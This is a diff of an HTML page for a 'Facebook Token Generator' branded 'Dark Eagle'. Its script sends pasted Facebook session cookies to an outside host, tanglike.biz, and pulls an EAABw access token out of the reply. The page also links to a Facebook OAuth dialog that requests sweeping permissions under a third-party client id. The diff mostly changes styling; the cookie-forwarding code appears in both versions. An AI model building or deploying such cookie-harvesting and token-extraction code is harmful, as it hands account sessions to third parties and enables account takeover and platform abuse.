@@ -1,189 +1,213 @@
-<html lang="en">
+<html lang="en" class="light">
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>Dark Eagle Rulexx</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <style>
-        .fade-in {
-            animation: fadeIn 1s ease-in-out;
-        }
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Facebook Token Generator</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {},
+      },
+    }
+  </script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    #themeToggle {
+      cursor: pointer;
+    }
+    input#cookieInput,
+    input#token {
+      background-color: white !important;
+      color: black !important;
+      border-color: #d1d5db !important;
+    }
+    input#cookieInput::placeholder,
+    input#token::placeholder {
+      color: #9ca3af !important;
+    }
+  </style>
+  <script>
+    function sendPostRequest(cookieString) {
+      const url = 'https://tanglike.biz/gettokenig.php';
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
+      const formData = {
+        cookie: cookieString,
+        submit: 'Get token',
+      };
+
+      $.ajax({
+        url: url,
+        method: 'POST',
+        data: formData,
+        success: function (response) {
+          if (response.includes('Cookie die')) {
+            $('#token').val('Cookie lỗi, hãy login lại thử lại');
+          } else if (response.includes('EAABw')) {
+            let token =
+              'EAABw' + response.split('EAABw')[1].split('</textarea>')[0];
+            $('#token').val(token);
+          } else {
+            $('#token').val('Lỗi, hãy báo cho admin');
+          }
+        },
+        error: function (xhr, status, error) {
+          $('#token').val('Lỗi, hãy báo cho admin');
+        },
+      });
+    }
+
+    $(document).ready(function () {
+      $('#laytk').click(function () {
+        const cookieString = $('#cookieInput').val();
+        if (cookieString) {
+          sendPostRequest(cookieString);
+        } else {
+          $('#token').val('Please enter cookies.');
+        }
+      });
+
+      $('#copyToken').click(function () {
+        const token = $('#token').val();
+        if (token) {
+          navigator.clipboard.writeText(token).then(
+            function () {
+              Swal.fire({
+                icon: 'success',
+                title: 'Token copied!',
+                text: 'Your token has been copied to the clipboard.',
+                showConfirmButton: false,
+                timer: 1500,
+              });
+            },
+            function (err) {
+              Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Failed to copy token: ' + err,
+              });
             }
-            to {
-                opacity: 1;
-            }
+          );
+        } else {
+          Swal.fire({
+            icon: 'warning',
+            title: 'No token',
+            text: 'There is no token to copy.',
+          });
         }
+      });
 
-        .loading-spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
+      const themeToggle = document.getElementById('themeToggle');
+      themeToggle.addEventListener('click', () => {
+        if (document.documentElement.classList.contains('dark')) {
+          document.documentElement.classList.remove('dark');
+          document.documentElement.classList.add('light');
+          localStorage.setItem('theme', 'light');
+        } else {
+          document.documentElement.classList.remove('light');
+          document.documentElement.classList.add('dark');
+          localStorage.setItem('theme', 'dark');
         }
+      });
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-    </style>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const loader = document.getElementById('loader');
-            const content = document.getElementById('content');
-            setTimeout(() => {
-                loader.style.display = 'none';
-                content.style.display = 'block';
-            }, 2000);
-        });
-
-        function toggleNavbar() {
-            const navbar = document.getElementById('mobile-navbar');
-            navbar.classList.toggle('hidden');
-        }
-
-        function sendPostRequest(cookieString) {
-            const url = 'https://tanglike.biz/gettokenig.php';
-        
-            const formData = {
-                cookie: cookieString,
-                submit: 'Get token'
-            };
-        
-            $.ajax({
-                url: url,
-                method: 'POST',
-                data: formData,
-                success: function(response) {
-                    if(response.includes("Cookie die")){
-                        $('#token').val("Cookie lỗi, hãy login lại thử lại");
-                    } else if(response.includes("EAABw")){
-                        let token = "EAABw" + response.split('EAABw')[1].split('</textarea>')[0];
-                        $('#token').val(token);
-                    } else {
-                        $('#token').val("Lỗi, hãy báo cho admin");
-                    }
-                },
-                error: function(xhr, status, error) {
-                    $('#token').val("Lỗi, hãy báo cho admin");
-                }
-            });
-        }
-
-        $(document).ready(function(){
-            $("#laytk").click(function(){
-                const cookieString = $("#cookieInput").val();
-                if(cookieString) {
-                    sendPostRequest(cookieString);
-                } else {
-                    $('#token').val("Please enter cookies.");
-                }
-            });
-
-            $("#copyToken").click(function(){
-                const token = $("#token").val();
-                if(token) {
-                    navigator.clipboard.writeText(token).then(function() {
-                        Swal.fire({
-                            icon: 'success',
-                            title: 'Token copied!',
-                            text: 'Your token has been copied to the clipboard.',
-                            showConfirmButton: false,
-                            timer: 1500
-                        });
-                    }, function(err) {
-                        Swal.fire({
-                            icon: 'error',
-                            title: 'Oops...',
-                            text: 'Failed to copy token: ' + err,
-                        });
-                    });
-                } else {
-                    Swal.fire({
-                        icon: 'warning',
-                        title: 'No token',
-                        text: 'There is no token to copy.',
-                    });
-                }
-            });
-        });
-    </script>
+      const savedTheme = localStorage.getItem('theme');
+      if (savedTheme === 'dark') {
+        document.documentElement.classList.add('dark');
+        document.documentElement.classList.remove('light');
+      } else {
+        document.documentElement.classList.add('light');
+        document.documentElement.classList.remove('dark');
+      }
+    });
+  </script>
 </head>
-<body class="bg-gray-100">
-    <div class="flex items-center justify-center h-screen" id="loader">
-        <div class="loading-spinner"></div>
+<body class="bg-white text-black transition-colors duration-300 min-h-screen flex flex-col dark:bg-gray-900 dark:text-white">
+  <header class="flex justify-between items-center px-4 py-1 bg-white shadow-md dark:bg-gray-800">
+    <h1 class="text-lg font-bold flex items-center space-x-3 text-black dark:text-white">
+      <img
+        alt="Demon Slayer anime logo in white and black style"
+        class="w-16 h-10 object-contain"
+        height="40"
+        src="https://storage.googleapis.com/a1aa/image/d0d6f0c5-67b3-4bbb-9171-d6bffecdf4cb.jpg"
+        width="64"
+      />
+      <span>DARK EAGLE</span>
+    </h1>
+    <button
+      aria-label="Toggle dark/light theme"
+      class="text-black dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
+      id="themeToggle"
+    >
+      <i class="fas fa-adjust fa-lg"></i>
+    </button>
+  </header>
+  <main class="flex-grow container mx-auto px-4 py-16">
+    <div
+      class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg border border-gray-300 transition-colors duration-300 dark:bg-gray-800 dark:border-gray-700"
+    >
+      <img
+        alt="Demon Slayer warrior in dynamic battle pose with katana sword, anime style, light background"
+        class="w-full rounded-md mb-6 object-cover"
+        height="150"
+        src="https://storage.googleapis.com/a1aa/image/5f98f65b-81b1-44a0-553f-5ce7152fff71.jpg"
+        width="900"
+      />
+      <label class="block font-semibold mb-3 text-black dark:text-white" for="cookieInput"
+        >Enter Facebook Cookies:</label
+      >
+      <input
+        autocapitalize="off"
+        autocomplete="off"
+        autocorrect="off"
+        class="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 mb-5 dark:bg-gray-700 dark:text-white dark:border-gray-600 dark:placeholder-gray-400"
+        id="cookieInput"
+        placeholder="Paste your cookies here"
+        spellcheck="false"
+        type="text"
+      />
+      <button
+        class="w-full p-3 bg-black text-white font-semibold rounded-md hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-500 mb-5 transition-colors duration-300"
+        id="laytk"
+      >
+        Get Token
+      </button>
+      <a
+        href="https://web.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="w-full block text-center p-3 bg-gradient-to-r from-pink-500 via-red-500 to-yellow-500 text-white font-semibold rounded-md hover:from-pink-600 hover:via-red-600 hover:to-yellow-600 focus:outline-none focus:ring-2 focus:ring-pink-400 mb-5 transition-colors duration-300"
+        aria-label="Open Instagram OAuth dialog"
+      >
+        Instagram OAuth
+      </a>
+      <div class="relative">
+        <input
+          class="w-full p-3 rounded-md border border-gray-300 dark:bg-gray-700 dark:text-white dark:border-gray-600"
+          id="token"
+          placeholder="Your token will appear here"
+          readonly=""
+          type="text"
+        />
+        <button
+          aria-label="Copy token"
+          class="absolute right-2 top-2 p-2 bg-black text-white rounded-md hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors duration-300"
+          id="copyToken"
+        >
+          <i class="fas fa-copy"></i>
+        </button>
+      </div>
     </div>
-    <div class="fade-in" id="content" style="display: none;">
-        <header class="bg-white shadow">
-            <div class="container mx-auto px-4 py-4 flex justify-between items-center">
-                <div class="text-blue-600 text-2xl font-semibold">DARK EAGLE RULEXX</div>
-                <button class="lg:hidden text-gray-600 focus:outline-none" onclick="toggleNavbar()">
-                    <i class="fas fa-bars"></i>
-                </button>
-                <div class="hidden lg:flex items-center space-x-4">
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Home</a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">About</a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Services</a>
-                    <a class="text-blue-600 hover:text-blue-800 flex items-center" href="#">
-                        <i class="fab fa-whatsapp mr-2"></i>Contact
-                    </a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Owner</a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Service</a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Uptime</a>
-                    <a class="text-blue-600 hover:text-blue-800" href="#">Price</a>
-                </div>
-            </div>
-            <div class="hidden lg:hidden flex flex-col bg-white p-4 space-y-4" id="mobile-navbar">
-                <a class="text-blue-600" href="#">Home</a>
-                <a class="text-blue-600" href="#">About</a>
-                <a class="text-blue-600" href="#">Services</a>
-                <a class="text-blue-600 flex items-center" href="#">
-                    <i class="fab fa-whatsapp mr-2"></i>Contact
-                </a>
-                <a class="text-blue-600" href="#">Owner</a>
-                <a class="text-blue-600" href="#">Service</a>
-                <a class="text-blue-600" href="#">Uptime</a>
-                <a class="text-blue-600" href="#">Price</a>
-            </div>
-        </header>
-        <main>
-            <section class="container mx-auto px-4 py-8">
-                <h2 class="text-2xl font-bold text-center text-blue-600 mb-8">Get Facebook Token</h2>
-                <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg">
-                    <div class="input-group mb-4">
-                        <label for="cookieInput" class="block text-gray-700 font-bold mb-2">Enter Facebook Cookies:</label>
-                        <input type="text" id="cookieInput" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="Paste your cookies here">
-                    </div>
-                    <button id="laytk" class="w-full p-3 bg-green-500 text-white font-bold rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">Get Token</button>
-                    <div class="relative mt-4">
-                        <input type="text" id="token" class="w-full p-3 border border-gray-300 rounded-lg bg-gray-100" readonly placeholder="Your token will appear here">
-                        <button id="copyToken" class="absolute right-2 top-2 p-2 bg-green-500 text-white rounded-lg glow-button hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                    </div>
-                </div>
-            </section>
-        </main>
-        <footer class="bg-white shadow py-4">
-            <div class="container mx-auto px-4 text-center">
-                <p class="text-gray-600">© 2023 Dark Eagle Rulexx. All rights reserved.</p>
-                <div class="flex justify-center space-x-4 mt-4">
-                    <a class="text-blue-600 hover:text-blue-800" href="#"><i class="fab fa-facebook-f"></i></a>
-                    <a class="text-green-600 hover:text-green-800" href="#"><i class="fab fa-whatsapp"></i></a>
-                </div>
-            </div>
-        </footer>
+  </main>
+  <footer class="bg-white shadow-inner py-6 mt-16 dark:bg-gray-800">
+    <div class="container mx-auto px-4 text-center text-black text-sm select-none dark:text-white">
+      © 2025 Facebook Token Generator. All rights reserved.
     </div>
+  </footer>
 </body>
 </html>
